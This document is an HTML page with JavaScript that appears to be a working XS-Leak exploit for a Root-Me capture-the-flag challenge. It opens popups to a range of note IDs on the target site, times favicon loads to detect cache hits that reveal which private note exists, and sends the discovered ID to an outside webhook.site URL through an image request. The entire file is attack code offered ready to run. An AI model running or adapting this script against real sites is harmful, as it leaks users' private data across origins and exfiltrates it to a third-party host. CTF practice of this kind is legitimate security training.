<!DOCTYPE html>
<html>
<head>
    <title>XS-Leak via Favicon Cache</title>
</head>
<body>
    <h1>Scanning notes...</h1>
    <div id="status"></div>
    <script>
        const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
        const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
        const START_ID = 2805;
        const END_ID = 3000;
        const DELAY_MS = 800;
        const POPUP_TIMEOUT = 1500;
        const FAVICON_URL = 'https://web-client-ch56.challenge01.root-me.org:58056/static/images/rootme.png';

        function updateStatus(msg) {
            const div = document.getElementById('status');
            div.innerHTML += msg + '<br>';
            console.log(msg);
        }

        async function measureFavicon(useCacheBuster = false) {
            const start = performance.now();
            await new Promise((resolve) => {
                const img = new Image();
                img.onload = () => resolve();
                img.onerror = () => resolve();
                let src = FAVICON_URL;
                if (useCacheBuster) src += '?t=' + Date.now();
                img.src = src;
            });
            return performance.now() - start;
        }

        async function openPopupAndCache(id) {
            const url = TARGET_BASE + id;
            const popup = window.open(url, '_blank');
            if (!popup) return false;
            await new Promise(r => setTimeout(r, POPUP_TIMEOUT));
            popup.close();
            return true;
        }

        async function run() {
            // Get baseline uncached time (with cache buster)
            const uncached = await measureFavicon(true);
            updateStatus(`Uncached favicon load: ${uncached.toFixed(2)} ms`);

            for (let id = START_ID; id <= END_ID; id++) {
                updateStatus(`Testing ID ${id}...`);
                const opened = await openPopupAndCache(id);
                if (!opened) {
                    updateStatus(`  Popup blocked`);
                    continue;
                }
                // Measure favicon load again (should be cached if page was valid)
                const cached = await measureFavicon(false);
                updateStatus(`  Favicon load after popup: ${cached.toFixed(2)} ms`);

                if (cached < uncached * 0.7) {
                    updateStatus(`✅ Valid note at ID ${id}`);
                    new Image().src = `${WEBHOOK}?id=${id}`;
                    break; // remove break to continue scanning
                }
                await new Promise(r => setTimeout(r, DELAY_MS));
            }
            updateStatus('Scan complete.');
        }

        run();
    </script>
</body>
</html>
